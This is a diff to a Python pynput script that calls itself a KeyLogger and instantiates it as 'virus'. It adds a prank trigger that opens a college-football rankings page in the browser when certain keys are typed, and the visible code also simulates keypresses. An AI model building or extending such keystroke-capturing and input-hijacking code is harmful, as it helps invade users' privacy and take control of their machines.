@@ -1,5 +1,5 @@
 from pynput.keyboard import Key, Listener, Controller
-import logging, os
+import logging, os, webbrowser
 
 
 class KeyLogger:
@@ -38,7 +38,10 @@ class KeyLogger:
             with keyboard.pressed(Key.shift):
                 keyboard.press('/')
 
-        
+        event_texas_is_back = ["'t'", "'e'", "'x'", "'a'"]
+        if self.coolList == event_texas_is_back:
+            #webbrowser.open('https://istexasback.com')
+            webbrowser.open('www.espn.com/college-football/rankings')
 
 def main():
     virus = KeyLogger()
